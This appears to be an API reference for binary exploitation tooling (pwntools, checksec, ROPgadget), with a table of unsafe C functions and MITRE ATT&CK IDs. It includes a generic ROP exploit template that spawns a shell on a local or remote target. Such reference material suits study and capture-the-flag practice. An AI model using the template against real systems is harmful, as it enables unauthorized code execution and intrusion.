# API Reference: Binary Exploitation Analysis

## pwntools (Python)
```bash
pip install pwntools
```

### ELF Analysis
```python
from pwn import ELF, ROP, context

elf = ELF('./vulnerable_binary')
print(elf.checksec())         # Security mitigations
print(hex(elf.sym['main']))   # Symbol address
print(hex(elf.plt['system'])) # PLT entry
print(hex(elf.got['puts']))   # GOT entry

# ROP gadget discovery
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
```

### Exploit Template
```python
from pwn import *

context.binary = elf = ELF('./vuln')
p = process('./vuln')  # or remote('host', port)
payload = flat(b'A' * offset, pop_rdi, next(elf.search(b'/bin/sh')), elf.plt['system'])
p.sendline(payload)
p.interactive()
```

## checksec CLI
```bash
checksec --file ./binary
checksec --file ./binary --output json
```

### Output Fields
| Field | Values | Impact |
|-------|--------|--------|
| NX | Enabled/Disabled | No shellcode on stack |
| PIE | Enabled/Disabled | Randomized addresses |
| Canary | Found/Not found | Stack smash detection |
| RELRO | Full/Partial/None | GOT write protection |

## ROPgadget CLI
```bash
# Find all gadgets
ROPgadget --binary ./vuln

# Search specific gadget
ROPgadget --binary ./vuln --only "pop|ret"

# Generate ROP chain
ROPgadget --binary ./vuln --ropchain
```

## Dangerous Functions
| Function | Risk |
|----------|------|
| gets() | Unbounded stdin read |
| strcpy() | No length check |
| sprintf() | No length check |
| scanf() | Possible overflow |

## MITRE ATT&CK
| Technique | Description |
|-----------|------------|
| T1203 | Exploitation for Client Execution |
| T1068 | Exploitation for Privilege Escalation |
| T1211 | Exploitation for Defense Evasion |
